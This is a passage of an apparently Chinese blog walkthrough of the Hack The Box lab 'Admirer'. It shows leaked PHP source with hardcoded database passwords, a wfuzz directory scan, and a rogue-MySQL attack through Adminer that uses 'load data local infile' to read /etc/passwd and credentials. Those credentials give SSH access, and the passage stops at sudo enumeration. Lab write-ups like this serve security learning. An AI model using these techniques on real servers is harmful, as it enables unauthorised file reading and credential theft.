candy...&#39;),(3,&#39;images&#x2F;thumbs&#x2F;thmb_nat01.jpg&#39;,&#39;images&#x2F;fulls&#x2F;nat01.jpg&#39;,&#39;The uncontrollable lightshow&#39;,&#39;When the sun decides to play at night.&#39;),(4,&#39;images&#x2F;thumbs&#x2F;thmb_arch02.jpg&#39;,&#39;images&#x2F;fulls&#x2F;arch02.jpg&#39;,&#39;Nearly Monochromatic&#39;,&#39;One could simply spend hours looking at this indoor square.&#39;),(5,&#39;images&#x2F;thumbs&#x2F;thmb_mind01.jpg&#39;,&#39;images&#x2F;fulls&#x2F;mind01.jpg&#39;,&#39;Way ahead of his time&#39;,&#39;You probably still use some of his inventions... 500yrs later.&#39;),(6,&#39;images&#x2F;thumbs&#x2F;thmb_mus02.jpg&#39;,&#39;images&#x2F;fulls&#x2F;mus02.jpg&#39;,&#39;The outcomes of complexity&#39;,&#39;Seriously, listen to Dust in Interstellar\&#39;s OST. Thank me later.&#39;),(7,&#39;images&#x2F;thumbs&#x2F;thmb_arch01.jpg&#39;,&#39;images&#x2F;fulls&#x2F;arch01.jpg&#39;,&#39;Back to basics&#39;,&#39;And centuries later, we want to go back and live in nature... Sort of.&#39;),(8,&#39;images&#x2F;thumbs&#x2F;thmb_mind02.jpg&#39;,&#39;images&#x2F;fulls&#x2F;mind02.jpg&#39;,&#39;We need him back&#39;,&#39;He might have been a loner who allegedly slept with a pigeon, but that brain...&#39;),(9,&#39;images&#x2F;thumbs&#x2F;thmb_eng01.jpg&#39;,&#39;images&#x2F;fulls&#x2F;eng01.jpg&#39;,&#39;In the name of Science&#39;,&#39;Some theories need to be proven.&#39;),(10,&#39;images&#x2F;thumbs&#x2F;thmb_mus01.jpg&#39;,&#39;images&#x2F;fulls&#x2F;mus01.jpg&#39;,&#39;Equal Temperament&#39;,&#39;Because without him, music would not exist (as we know it today).&#39;);</span><br><span class="line">&#x2F;*!40000 ALTER TABLE &#96;items&#96; ENABLE KEYS *&#x2F;;</span><br><span class="line">UNLOCK TABLES;</span><br><span class="line">&#x2F;*!40103 SET TIME_ZONE&#x3D;@OLD_TIME_ZONE *&#x2F;;</span><br><span class="line"></span><br><span class="line">&#x2F;*!40101 SET SQL_MODE&#x3D;@OLD_SQL_MODE *&#x2F;;</span><br><span class="line">&#x2F;*!40014 SET FOREIGN_KEY_CHECKS&#x3D;@OLD_FOREIGN_KEY_CHECKS *&#x2F;;</span><br><span class="line">&#x2F;*!40014 SET UNIQUE_CHECKS&#x3D;@OLD_UNIQUE_CHECKS *&#x2F;;</span><br><span class="line">&#x2F;*!40101 SET CHARACTER_SET_CLIENT&#x3D;@OLD_CHARACTER_SET_CLIENT *&#x2F;;</span><br><span class="line">&#x2F;*!40101 SET CHARACTER_SET_RESULTS&#x3D;@OLD_CHARACTER_SET_RESULTS *&#x2F;;</span><br><span class="line">&#x2F;*!40101 SET COLLATION_CONNECTION&#x3D;@OLD_COLLATION_CONNECTION *&#x2F;;</span><br><span class="line">&#x2F;*!40111 SET SQL_NOTES&#x3D;@OLD_SQL_NOTES *&#x2F;;</span><br><span class="line"></span><br><span class="line">-- Dump completed on 2019-12-02 20:24:15</span><br></pre></td></tr></table></figure>
<p>è§£å‹html.tar.gz</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># kali @ kali in ~&#x2F;HackTheBox&#x2F;Admirer&#x2F;html [12:51:51] </span><br><span class="line">$ ls -l</span><br><span class="line">total 28</span><br><span class="line">drwxr-x--- 6 kali kali 4096 6æœˆ   7  2019 assets</span><br><span class="line">drwxr-x--- 4 kali kali 4096 12æœˆ  3 04:29 images</span><br><span class="line">-rw-r----- 1 kali kali 4613 12æœˆ  4 04:20 index.php</span><br><span class="line">-rw-r----- 1 kali kali  134 12æœˆ  2 05:31 robots.txt</span><br><span class="line">drwxr-x--- 2 kali kali 4096 12æœˆ  3 01:50 utility-scripts</span><br><span class="line">drwxr-x--- 2 kali kali 4096 12æœˆ  3 01:25 w4ld0s_s3cr3t_d1r</span><br></pre></td></tr></table></figure>
<p>utility-scriptsç›®å½•ä¸‹çš„æ–‡ä»¶</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># kali @ kali in ~&#x2F;HackTheBox&#x2F;Admirer&#x2F;html&#x2F;utility-scripts [12:53:54] </span><br><span class="line">$ ls -la</span><br><span class="line">total 24</span><br><span class="line">drwxr-x--- 2 kali kali 4096 12æœˆ  3 01:50 .</span><br><span class="line">drwx------ 6 kali kali 4096 5æœˆ  20 14:29 ..</span><br><span class="line">-rw-r----- 1 kali kali 1795 12æœˆ  3 01:48 admin_tasks.php</span><br><span class="line">-rw-r----- 1 kali kali  401 12æœˆ  2 06:28 db_admin.php</span><br><span class="line">-rw-r----- 1 kali kali   20 11æœˆ 30 03:32 info.php</span><br><span class="line">-rw-r----- 1 kali kali   53 12æœˆ  3 01:40 phptest.php</span><br></pre></td></tr></table></figure>
<p>admin_tasks.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">  &lt;title&gt;Administrative Tasks&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">  &lt;h3&gt;Admin Tasks Web Interface (v0.01 beta)&lt;/h3&gt;</span><br><span class="line">  <span class="meta">&lt;?php</span></span><br><span class="line">  <span class="comment">// Web Interface to the admin_tasks script</span></span><br><span class="line">  <span class="comment">// </span></span><br><span class="line">  <span class="keyword">if</span>(<span class="keyword">isset</span>($_REQUEST[<span class="string">&#x27;task&#x27;</span>]))</span><br><span class="line">  &#123;</span><br><span class="line">    $task = $_REQUEST[<span class="string">&#x27;task&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>($task == <span class="string">&#x27;1&#x27;</span> || $task == <span class="string">&#x27;2&#x27;</span> || $task == <span class="string">&#x27;3&#x27;</span> || $task == <span class="string">&#x27;4&#x27;</span> ||</span><br><span class="line">       $task == <span class="string">&#x27;5&#x27;</span> || $task == <span class="string">&#x27;6&#x27;</span> || $task == <span class="string">&#x27;7&#x27;</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/*********************************************************************************** </span></span><br><span class="line"><span class="comment">         Available options:</span></span><br><span class="line"><span class="comment">           1) View system uptime</span></span><br><span class="line"><span class="comment">           2) View logged in users</span></span><br><span class="line"><span class="comment">           3) View crontab (current user only)</span></span><br><span class="line"><span class="comment">           4) Backup passwd file (not working)</span></span><br><span class="line"><span class="comment">           5) Backup shadow file (not working)</span></span><br><span class="line"><span class="comment">           6) Backup web data (not working)</span></span><br><span class="line"><span class="comment">           7) Backup database (not working)</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">           <span class="doctag">NOTE:</span> Options 4-7 are currently NOT working because they need root privileges.</span></span><br><span class="line"><span class="comment">                 I&#x27;m leaving them in the valid tasks in case I figure out a way</span></span><br><span class="line"><span class="comment">                 to securely run code as root from a PHP page.</span></span><br><span class="line"><span class="comment">      ************************************************************************************/</span></span><br><span class="line">      <span class="keyword">echo</span> str_replace(<span class="string">&quot;\n&quot;</span>, <span class="string">&quot;&lt;br /&gt;&quot;</span>, shell_exec(<span class="string">&quot;/opt/scripts/admin_tasks.sh <span class="subst">$task</span> 2&gt;&amp;1&quot;</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">echo</span>(<span class="string">&quot;Invalid task.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125; </span><br><span class="line">  <span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">  &lt;p&gt;</span><br><span class="line">  &lt;h4&gt;Select task:&lt;/p&gt;</span><br><span class="line">  &lt;form method=<span class="string">&quot;POST&quot;</span>&gt;</span><br><span class="line">    &lt;select name=<span class="string">&quot;task&quot;</span>&gt;</span><br><span class="line">      &lt;option value=<span class="number">1</span>&gt;View system uptime&lt;/option&gt;</span><br><span class="line">      &lt;option value=<span class="number">2</span>&gt;View logged in users&lt;/option&gt;</span><br><span class="line">      &lt;option value=<span class="number">3</span>&gt;View crontab&lt;/option&gt;</span><br><span class="line">      &lt;option value=<span class="number">4</span> disabled&gt;Backup passwd file&lt;/option&gt;</span><br><span class="line">      &lt;option value=<span class="number">5</span> disabled&gt;Backup shadow file&lt;/option&gt;</span><br><span class="line">      &lt;option value=<span class="number">6</span> disabled&gt;Backup web data&lt;/option&gt;</span><br><span class="line">      &lt;option value=<span class="number">7</span> disabled&gt;Backup database&lt;/option&gt;</span><br><span class="line">    &lt;/select&gt;</span><br><span class="line">    &lt;input type=<span class="string">&quot;submit&quot;</span>&gt;</span><br><span class="line">  &lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
<p>db_admin.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  $servername = <span class="string">&quot;localhost&quot;</span>;</span><br><span class="line">  $username = <span class="string">&quot;waldo&quot;</span>;</span><br><span class="line">  $password = <span class="string">&quot;Wh3r3_1s_w4ld0?&quot;</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Create connection</span></span><br><span class="line">  $conn = <span class="keyword">new</span> mysqli($servername, $username, $password);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Check connection</span></span><br><span class="line">  <span class="keyword">if</span> ($conn-&gt;connect_error) &#123;</span><br><span class="line">      <span class="keyword">die</span>(<span class="string">&quot;Connection failed: &quot;</span> . $conn-&gt;connect_error);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;Connected successfully&quot;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="comment">// <span class="doctag">TODO:</span> Finish implementing this or find a better open source alternative</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>info.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> phpinfo(); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>phptest.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="keyword">echo</span>(<span class="string">&quot;Just a test to see if PHP works.&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>æš´éœ²äº†ä¸€ä¸ªæ•°æ®åº“çš„ç”¨æˆ·åå’Œå¯†ç ã€‚ä½†æ˜¯åé¢çš„æ³¨é‡Šæç¤º<code>a better open source alternative</code>ï¼Œç”¨wfuzzæ‰«æè¯¥ç›®å½•ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># kali @ kali in ~&#x2F;HackTheBox&#x2F;Admirer&#x2F;html&#x2F;utility-scripts [12:53:55] </span><br><span class="line">$ wfuzz -c -w &#x2F;usr&#x2F;share&#x2F;seclists&#x2F;Discovery&#x2F;Web-Content&#x2F;big.txt -z list,php-txt-html --hc 403,404 -t 100 -u http:&#x2F;&#x2F;10.10.10.187&#x2F;utility-scripts&#x2F;FUZZ.FUZ2Z</span><br><span class="line"></span><br><span class="line">Warning: Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz&#39;s documentation for more information.</span><br><span class="line"></span><br><span class="line">********************************************************</span><br><span class="line">* Wfuzz 2.4.5 - The Web Fuzzer                         *</span><br><span class="line">********************************************************</span><br><span class="line"></span><br><span class="line">Target: http:&#x2F;&#x2F;10.10.10.187&#x2F;utility-scripts&#x2F;FUZZ.FUZ2Z</span><br><span class="line">Total requests: 61419</span><br><span class="line"></span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">ID           Response   Lines    Word     Chars       Payload</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line"></span><br><span class="line">000005617:   200        51 L     235 W    4156 Ch     &quot;adminer - php&quot;</span><br><span class="line">000028852:   200        964 L    4976 W   84023 Ch    &quot;info - php&quot;</span><br><span class="line">000041602:   200        0 L      8 W      32 Ch       &quot;phptest - php&quot;</span><br><span class="line"></span><br><span class="line">Total time: 266.5721</span><br><span class="line">Processed Requests: 61419</span><br><span class="line">Filtered Requests: 61416</span><br><span class="line">Requests&#x2F;sec.: 230.4028</span><br></pre></td></tr></table></figure>
<p>è®¿é—®<code>http://10.10.10.178/utility-scripts/adminer.php</code></p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200521131354.png" alt=""></p>
<h3 id="Getting-User-Access">Getting User Access</h3>
<p>ç”¨ä¹‹å‰å¾—åˆ°çš„ç”¨æˆ·åå’Œå¯†ç å°è¯•ç™»å½•å¤±è´¥ï¼ŒGoogle <code>Adminer database manager</code>ï¼Œå¾—åˆ°ä¸€ç§åˆ©ç”¨æ–¹å¼ï¼š</p>
<blockquote>
<p><a href="https://www.foregenix.com/blog/serious-vulnerability-discovered-in-adminer-tool">Serious Vulnerability Discovered in Adminer database Administration Tool</a></p>
</blockquote>
<p>ç®€å•æ¥è®²å°±æ˜¯ï¼Œå…ˆé…ç½®æœ¬åœ°çš„MySQLæ•°æ®åº“ï¼Œå…è®¸è¿œç¨‹è¿æ¥ç™»å½•ï¼Œç„¶åç”¨é¶æœºä¸Šçš„adminer database managerè¿æ¥æˆ‘ä»¬æœ¬åœ°çš„æ•°æ®åº“ï¼Œå†å°†é¶æœºçš„æ•æ„Ÿæ–‡ä»¶é€šè¿‡adminerå†™å…¥æ•°æ®åº“ï¼Œæœ€åä»æœ¬åœ°è¯»å–æ•æ„Ÿæ–‡ä»¶ã€‚</p>
<p>åœ¨kaliä¸Šç”¨rootç™»å½•MySQLï¼Œæ–°å»ºä¸€ä¸ªæ•°æ®åº“ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">MariaDB [(none)]&gt; CREATE DATABASE admirer;</span><br></pre></td></tr></table></figure>
<p>åˆ›å»ºä¸€ä¸ªç”¨æˆ·ï¼Œå¦‚æœæƒ³è®©è¯¥ç”¨æˆ·å¯ä»¥<strong>ä»ä»»æ„è¿œç¨‹ä¸»æœºç™»é™†</strong>ï¼Œå¯ä»¥ä½¿ç”¨é€šé…ç¬¦<code>%</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">MariaDB [(none)]&gt; CREATE USER &#39;demo&#39;@&#39;%&#39; IDENTIFIED BY &#39;demo_admirer&#39;;</span><br></pre></td></tr></table></figure>
<p>ç»™æ–°ç”¨æˆ·æˆæƒï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">MariaDB [(none)]&gt; GRANT ALL PRIVILEGES ON * . * TO <span class="string">&#x27;demo&#x27;</span>@<span class="string">&#x27;%&#x27;</span>;</span><br></pre></td></tr></table></figure>
<p>é‡æ–°åŠ è½½æƒé™ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">MariaDB [(none)]&gt; FLUSH PRIVILEGES;</span><br></pre></td></tr></table></figure>
<p>åˆ›å»ºæ–°æ•°æ®è¡¨<code>test</code>ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">MariaDB [(admirer)]&gt; create table test(data VARCHAR(255));</span><br></pre></td></tr></table></figure>
<p>é…ç½®æ•°æ®åº“ä½¿å¾—èƒ½è¿œç¨‹è¿æ¥ï¼Œä¿®æ”¹<code>/etc/mysql/mariadb.conf.d/50-server.cnf</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">bind-address      &#x3D;0.0.0.0</span><br></pre></td></tr></table></figure>
<p>é‡å¯MySQLæœåŠ¡ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">systemctl restart mysql</span><br></pre></td></tr></table></figure>
<p>åœ¨æœ¬åœ°éªŒè¯èƒ½å¦ç™»å½•ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ mysql -h localhost -u demo -p</span><br><span class="line">Enter password: </span><br><span class="line">Welcome to the MariaDB monitor.  Commands end with ; or \g.</span><br><span class="line">Your MariaDB connection id is 42</span><br><span class="line">Server version: 10.3.22-MariaDB-1 Debian buildd-unstable</span><br><span class="line"></span><br><span class="line">Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.</span><br><span class="line"></span><br><span class="line">Type &#39;help;&#39; or &#39;\h&#39; for help. Type &#39;\c&#39; to clear the current input statement.</span><br><span class="line"></span><br><span class="line">MariaDB [(none)]&gt; </span><br></pre></td></tr></table></figure>
<p>æˆåŠŸç™»å½•ï¼Œåœ¨admineré¡µé¢è¿œç¨‹ç™»å½•ï¼š</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200521155908.png" alt=""></p>
<p>It Workï¼ï¼ï¼</p>
<p>éªŒè¯èƒ½å¦ä½¿ç”¨<code>load data infile</code>è¯­å¥è¯»å–æ–‡ä»¶ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">load data local infile &#39;&#x2F;etc&#x2F;passwd&#39;</span><br><span class="line">into table test</span><br><span class="line">fields terminated by &quot;&#x2F;n&quot;</span><br></pre></td></tr></table></figure>
<img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200521160523.png" style="zoom:67%;" />
<p>çœ‹ä¸€ä¸‹phpinfo()ï¼š</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200521160942.png" alt=""></p>
<p><code>open_basedir</code>é™åˆ¶äº†æ ¹è·¯å¾„ï¼Œå°è¯•è¯»å–<code>index.php</code>æ–‡ä»¶ï¼š</p>
<img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200521163446.png" style="zoom:67%;" />
<p>è¯»å–æˆåŠŸï¼Œç”¨Selectè¯­å¥æ˜¾ç¤ºï¼š</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200521163826.png" alt=""></p>
<p>å¾—åˆ°<code>waldo: &amp;&lt;h5b~yK3F#&#123;PaPB&amp;dA&#125;&#123;H&gt;</code>å‡­è¯ç”¨æ¥ç™»å½•SSH</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ ssh waldo@10.10.10.187</span><br><span class="line">waldo@10.10.10.187&#39;s password: </span><br><span class="line">Linux admirer 4.9.0-12-amd64 x86_64 GNU&#x2F;Linux</span><br><span class="line"></span><br><span class="line">The programs included with the Devuan GNU&#x2F;Linux system are free software;</span><br><span class="line">the exact distribution terms for each program are described in the</span><br><span class="line">individual files in &#x2F;usr&#x2F;share&#x2F;doc&#x2F;*&#x2F;copyright.</span><br><span class="line"></span><br><span class="line">Devuan GNU&#x2F;Linux comes with ABSOLUTELY NO WARRANTY, to the extent</span><br><span class="line">permitted by applicable law.</span><br><span class="line">You have new mail.</span><br><span class="line">Last login: Wed Apr 29 10:56:59 2020 from 10.10.14.3</span><br><span class="line">waldo@admirer:~$ id</span><br><span class="line">uid&#x3D;1000(waldo) gid&#x3D;1000(waldo) groups&#x3D;1000(waldo),1001(admins)</span><br><span class="line">waldo@admirer:~$ cat user.txt </span><br><span class="line">7222------------------------2c18</span><br></pre></td></tr></table></figure>
<h3 id="Getting-Root-Access">Getting Root Access</h3>
<p>æŸ¥çœ‹waldoèƒ½è¿è¡Œçš„è„šæœ¬æˆ–ç¨‹åº</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">waldo@admirer:~$ sudo -l</span><br><span class="line">[sudo] password <span class="keyword">for</span> waldo: </span><br><span class="line">Matching Defaults entries <span class="keyword">for</span> waldo on admirer:</span><br><span class="line">    env_reset, env_file=/etc/sudoenv, mail_badpass, secure_path=/usr/<span class="built_in">local</span>/sbin\:/usr/<span class="built_in">local</span>/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, listpw=always</span><br><span class="line"></span><br><span class="line">User waldo may run the following commands on admirer:</span><br><span class="line">    (ALL) SETENV: /opt/scripts/admin_tasks.sh</span><br></pre></td></tr></table></figure>
<p>admin_tasks.sh</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line">view_uptime()</span><br><span class="line">&#123;</span><br><span class="line">    /usr/bin/uptime -p</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">view_users()</span><br><span class="line">&#123;</span><br><span class="line">    /usr/bin/w</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">view_crontab()</span><br><span class="line">&#123;</span><br><span class="line">    /usr/bin/crontab -l</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">backup_passwd()</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> [ <span class="string">&quot;<span class="variable">$EUID</span>&quot;</span> -eq 0 ]</span><br><span class="line">    <span class="keyword">then</span></span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;Backing up /etc/passwd to /var/backups/passwd.bak...&quot;</span></span><br><span class="line">        /bin/cp /etc/passwd /var/backups/passwd.bak</span><br><span class="line">        /bin/chown root:root /var/backups/passwd.bak</span><br><span class="line">        /bin/chmod 600 /var/backups/passwd.bak</span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;Done.&quot;</span></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;Insufficient privileges to perform the selected operation.&quot;</span></span><br><span class="line">    <span class="keyword">fi</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">backup_shadow()</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> [ <span class="string">&quot;<span class="variable">$EUID</span>&quot;</span> -eq 0 ]</span><br><span class="line">    <span class="keyword">then</span></span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;Backing up /etc/shadow to /var/backups/shadow.bak...&quot;</span></span><br><span class="line">        /bin/cp /etc/shadow /var/backups/shadow.bak</span><br><span class="line">        /bin/chown root:shadow /var/backups/shadow.bak</span><br><span class="line">        /bin/chmod 600 /var/backups/shadow.bak</span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;Done.&quot;</span></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;Insufficient privileges to perform the selected operation.&quot;</span></span><br><span class="line">    <span class="keyword">fi</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">backup_web()</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> [ <span class="string">&quot;<span class="variable">$EUID</span>&quot;</span> -eq 0 ]</span><br><span class="line">    <span class="keyword">then</span></span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;Running backup script in the background, it might take a while...&quot;</span></span><br><span class="line">        /opt/scripts/backup.py &amp;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;Insufficient privileges to perform the selected operation.&quot;</span></span><br><span class="line">    <span class="keyword">fi</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">backup_db()</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> [ <span class="string">&quot;<span class="variable">$EUID</span>&quot;</span> -eq 0 ]</span><br><span class="line">    <span class="keyword">then</span></span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;Running mysqldump in the background, it may take a while...&quot;</span></span><br><span class="line">        <span class="comment">#/usr/bin/mysqldump -u root admirerdb &gt; /srv/ftp/dump.sql &amp;</span></span><br><span class="line">        /usr/bin/mysqldump -u root admirerdb &gt; /var/backups/dump.sql &amp;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;Insufficient privileges to perform the selected operation.&quot;</span></span><br><span class="line">    <span class="keyword">fi</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># Non-interactive way, to be used by the web interface</span></span><br><span class="line"><span class="keyword">if</span> [ <span class="variable">$#</span> -eq 1 ]</span><br><span class="line"><span class="keyword">then</span></span><br><span class="line">    option=<span class="variable">$1</span></span><br><span class="line">    <span class="keyword">case</span> <span class="variable">$option</span> <span class="keyword">in</span></span><br><span class="line">        1) view_uptime ;;</span><br><span class="line">        2) view_users ;;</span><br><span class="line">        3) view_crontab ;;</span><br><span class="line">        4) backup_passwd ;;</span><br><span class="line">        5) backup_shadow ;;</span><br><span class="line">        6) backup_web ;;</span><br><span class="line">        7) backup_db ;;</span><br><span class="line"></span><br><span class="line">        *) <span class="built_in">echo</span> <span class="string">&quot;Unknown option.&quot;</span> &gt;&amp;2</span><br><span class="line">    <span class="keyword">esac</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">exit</span> 0</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># Interactive way, to be called from the command line</span></span><br><span class="line">options=(<span class="string">&quot;View system uptime&quot;</span></span><br><span class="line">         <span class="string">&quot;View logged in users&quot;</span></span><br><span class="line">         <span class="string">&quot;View crontab&quot;</span></span><br><span class="line">         <span class="string">&quot;Backup passwd file&quot;</span></span><br><span class="line">         <span class="string">&quot;Backup shadow file&quot;</span></span><br><span class="line">         <span class="string">&quot;Backup web data&quot;</span></span><br><span class="line">         <span class="string">&quot;Backup DB&quot;</span></span><br><span class="line">         <span class="string">&quot;Quit&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;[[[ System Administration Menu ]]]&quot;</span></span><br><span class="line">PS3=<span class="string">&quot;Choose an option: &quot;</span></span><br><span class="line">COLUMNS=11</span><br><span class="line">select opt <span class="keyword">in</span> <span class="string">&quot;<span class="variable">$&#123;options[@]&#125;</span>&quot;</span>; <span class="keyword">do</span></span><br><span class="line">    <span class="keyword">case</span> <span class="variable">$REPLY</span> <span class="keyword">in</span></span><br><span class="line">        1) view_uptime ; <span class="built_in">break</span> ;;</span><br><span class="line">        2) view_users ; <span class="built_in">break</span> ;;</span><br><span class="line">        3) view_crontab ; <span class="built_in">break</span> ;;</span><br><span class="line">        4) backup_passwd ; <span class="built_in">break</span> ;;</span><br><span class="line">        5) backup_shadow ; <span class="built_in">break</span> ;;</span><br><span class="line">        6) backup_web ; <span class="built_in">break</span> ;;</span><br><span class="line">        7) backup_db ; <span class="built_in">break</span> ;;</span><br><span class="line">        8) <span class="built_in">echo</span> <span class="string">&quot;Bye!&quot;</span> ; <span class="built_in">break</span> ;;</span><br><span class="line"></span><br><span class="line">        *) <span class="built_in">echo</span> <span class="string">&quot;Unknown option.&quot;</span> &gt;&amp;2</span><br><span class="line">    <span class="keyword">esac</span></span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">exit</span> 0</span><br></pre></td></tr></table></figure>
<p>åœ¨å‡ ä¸ªéœ€è¦rootæƒé™è¿è¡Œçš„å‡½æ•°ä¸­ï¼Œ<code>backup_web()</code>è°ƒç”¨äº†åŒç›®å½•ä¸‹çš„<code>backup.py</code>è„šæœ¬æ–‡ä»¶ã€‚</p>
<p><a href="http://backup.py">backup.py</a></p>
